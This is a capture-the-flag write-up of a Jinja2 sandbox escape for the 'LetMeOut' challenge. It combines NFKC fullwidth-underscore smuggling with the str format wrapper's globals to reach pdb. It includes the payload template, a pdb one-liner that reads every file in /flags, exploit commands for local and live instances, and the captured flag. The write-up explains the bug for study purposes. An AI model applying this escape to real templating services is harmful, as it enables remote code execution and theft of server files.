# LetMeOut

**Event:** HICyberCon CTF 2026
**Category:** pwn
**Flag:** `hiCTF{__^_^__n0rm4l1z3_b3f0r3_y0u_tru5t__>_<___77331508e2}`

---

**Category:** web · **Files:** `letmeout.zip` (source in `ext/`) · **Flag format:** `hiCTF{}`
**LIVE INSTANCE** required for the real flag: `ncat --ssl <host> 1337`.

## The jail (`ext/jail.py`, abridged)
```python
class Tag(str):
    __slots__ = ()
    def __str__(self): return unicodedata.normalize("NFKC", self)
def rich(v):  return Tag(v)
def plain(v): return str(Tag(v))
filters = dict(zip(random.sample(NAMES, 2), (rich, plain)))     # NAMES = buff..tuff
for _ in range(32):
    layout = input()
    if layout.isascii() and len(layout) <= 170 and len({c for c in layout if c.isalpha()}) <= 3:
        env = SandboxedEnvironment(); env.globals.clear(); env.filters.clear()
        env.filters.update(filters)
        print(env.from_string(layout).render())
```
So: one `{{ expression }}`, ≤170 chars, ≤3 **distinct** letters, only two filters (`rich`/`plain`),
no globals, sandboxed attribute access.

## Vulnerability 1 - NFKC smuggles the attribute name past the guard
`jinja2.sandbox.SandboxedEnvironment.getitem` (3.1.6):
```python
try: return obj[argument]                 # (A) NO safety check
except (TypeError, LookupError):
    if isinstance(argument, str):
        attr = str(argument)              # (B) Tag.__str__ -> NFKC(argument)
        value = getattr(obj, attr)        # (C) attribute fetched with the NORMALISED name
        if self.is_safe_attribute(obj, argument, value):   # (D) guard sees the RAW argument
            return value
```
`is_safe_attribute` rejects `attr.startswith("_")`. But `attr` here is `str(argument)`, i.e. the
**NFKC-normalised** string, while the guard is applied to the **raw** `argument`. A `Tag` whose raw
text starts with **U+FF3F FULLWIDTH LOW LINE** (`\uff3f`, NFKC -> `_`) therefore renders as
`__class__` for `getattr` while passing `startswith("_")` and `is_internal_attribute`.

## Vulnerability 2 - `wrap_str_format` hands out an unsandboxed function
`getitem` returns `self.wrap_str_format(value)` **before** the safety check. For any `str`/`str`
subclass, `["format"]` (a *non-underscore* name, so the guard would allow it anyway) returns a
freshly-built Python **wrapper function defined inside `jinja2/sandbox.py`**. Its `__globals__` is the
`jinja2.sandbox` module namespace → `["__builtins__"]` → `["breakpoint"]` → **pdb**, whose stdin is the
raw socket: from there every restriction (length / letters / sandbox) is gone.

## Payload (≤168 chars for **all ten** possible filter names)
```
{{(0|<F>)[<"format">][("<lit __globals__>"|<F>)][<"__builtins__">][<"breakpoint">]()}}
```
* every attribute/string letter is written as a 3-digit **octal escape** (`\137\143…`), which the jinja
  lexer decodes with `.encode("ascii","backslashreplace").decode("unicode-escape")` - octal contains
  only digits, so it contributes **zero** alphabetic characters;
* the only literal letters are those of the chosen `rich` filter name (all are `?uff` ⇒ {x,u,f} = 3
  distinct letters);
* `lit __globals__` is `"\uff3f_\147l\157\142\141l\163__"` (leading U+FF3F + octal).

Inside pdb (no `/bin/sh` in the image, so read files directly):
```python
import os,sys; sys.stdout.write('<<'+''.join(open('/flags/'+f).read() for f in os.listdir('/flags'))+'>>'); sys.stdout.flush()
```
The real flag is the `hiCTF{...}` line; the other three names are decoys
("not the flag you're looking for").

## Reproduce
```bash
# offline (Docker image built from ext/, verified locally):
cd LetMeOut && docker build -t letmeout-local ext/ && python3 exploit.py local
# live:
python3 exploit.py remote <host> 1337
```
`exploit.py` probes all ten filter names (`{{0|name}}` prints `0` iff the name exists), tries each
present name (only the `rich` one yields a `Tag`, so only it enters pdb), drives pdb, and prints the
`/flags/*` contents.

## Verified
`python3 exploit.py remote letmeout-10ca6df92e4f.chall.hiddeninvestigations.net 1337` →
```
[*] filters present: ['luff', 'tuff']
[*] trying rich filter luff (payload 159 chars)
[+] inside pdb
RESULT: not the flag you're looking for
        not the flag you're looking for
        not the flag you're looking for
        hiCTF{__^_^__n0rm4l1z3_b3f0r3_y0u_tru5t__>_<___77331508e2}
```
**FLAG: `hiCTF{__^_^__n0rm4l1z3_b3f0r3_y0u_tru5t__>_<___77331508e2}`**  (the flag name itself names
the bug: "normalize before you trust" - `getitem` normalised for `getattr` but guarded the raw value).

Offline (`python3 exploit.py local`) returns the image's placeholder
`hiCTF{fake_flag_for_local_testing}` + 3 decoys, which proves the read path independent of the real flag.
